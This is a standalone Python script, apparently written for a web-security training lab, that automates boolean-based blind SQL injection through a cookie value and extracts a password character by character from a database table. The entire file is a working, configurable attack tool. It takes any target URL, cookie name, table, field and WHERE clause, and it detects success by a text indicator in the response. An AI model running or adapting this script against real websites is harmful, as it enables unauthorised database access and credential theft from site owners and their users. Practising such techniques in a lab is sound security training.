#!/usr/bin/env python3

from pwn import *
from termcolor import colored
import requests
import string
import sys
import signal
import time
import argparse

def def_handler(sig, frame):
    print(colored("\n[!] Exiting...", "red"))
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def parse_arguments():
    parser = argparse.ArgumentParser(
        description="SQL Injection - Blind Password Extraction",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -u http://example.com/ -c TrackingId -s session_value
  %(prog)s -u http://example.com/ -c TrackingId -s session_value -l 30 -t users -f password -w username='admin'
  %(prog)s -u http://example.com/ -c TrackingId -s session_value --chars "0123456789abcdef"
        """
    )
    
    # Argumentos obligatorios
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('-c', '--cookie-name', required=True, help='Cookie name for injection (e.g., TrackingId)')
    parser.add_argument('-s', '--session', required=True, help='Session cookie value')
    
    # Argumentos opcionales
    parser.add_argument('-l', '--length', type=int, default=20, help='Maximum password length (default: 20)')
    parser.add_argument('-t', '--table', default='users', help='Table name (default: users)')
    parser.add_argument('-f', '--field', default='password', help='Field to extract (default: password)')
    parser.add_argument('-w', '--where', default="username='administrator'", help='WHERE clause (default: username=\'administrator\')')
    parser.add_argument('-i', '--indicator', default='Welcome back!', help='Success indicator text (default: "Welcome back!")')
    parser.add_argument('--chars', default=None, help='Custom character set (default: a-zA-Z0-9)')
    parser.add_argument('--delay', type=float, default=0, help='Delay between requests in seconds (default: 0)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    
    return parser.parse_args()

def makeSQLI(args):
    # Configurar conjunto de caracteres
    if args.chars:
        characters = args.chars
    else:
        characters = string.ascii_letters + string.digits
    
    p1 = log.progress("SQL Injection")
    p1.status("Starting SQL Injection Attack...")
    
    password = ""
    p2 = log.progress(f"Extracting {args.field}")
    time.sleep(1)
    
    for position in range(1, args.length + 1):
        found = False
        for char in characters:
            # Construir la inyección SQL
            injection = f"' and (select substring({args.field},{position},1) from {args.table} where {args.where})='{char}' -- -"
            
            cookies = {
                args.cookie_name: injection,
                "session": args.session
            }
            
            try:
                response = requests.get(args.url, cookies=cookies, timeout=10)
                
                if args.indicator in response.text:
                    password += char
                    p2.status(f"Current extracted {args.field}: {password}")
                    
                    if args.verbose:
                        print(colored(f"[+] Found character: {char} at position {position}", "green"))
                    
                    found = True
                    break
                
                # Delay entre peticiones si se especifica
                if args.delay > 0:
                    time.sleep(args.delay)
                    
            except requests.exceptions.RequestException as e:
                print(colored(f"\n[!] Request error: {e}", "red"))
                continue
        
        # Si no se encontró ningún carácter, probablemente llegamos al final
        if not found:
            p2.success(f"Final {args.field}: {password}")
            p1.success("SQL Injection completed!")
            break
    else:
        # Se alcanzó la longitud máxima
        p2.success(f"Final {args.field}: {password} (max length reached)")
        p1.success("SQL Injection completed!")
    
    return password

if __name__ == "__main__":
    args = parse_arguments()
    
    # Mostrar configuración si verbose está activo
    if args.verbose:
        print(colored("\n[*] Configuration:", "cyan"))
        print(f"    URL: {args.url}")
        print(f"    Cookie: {args.cookie_name}")
        print(f"    Table: {args.table}")
        print(f"    Field: {args.field}")
        print(f"    Where: {args.where}")
        print(f"    Max Length: {args.length}")
        print(f"    Indicator: {args.indicator}")
        print(f"    Delay: {args.delay}s\n")
    
    try:
        password = makeSQLI(args)
        print(colored(f"\n[✓] Extraction complete: {password}", "green", attrs=["bold"]))
    except Exception as e:
        print(colored(f"\n[!] Error: {e}", "red"))
        sys.exit(1)
    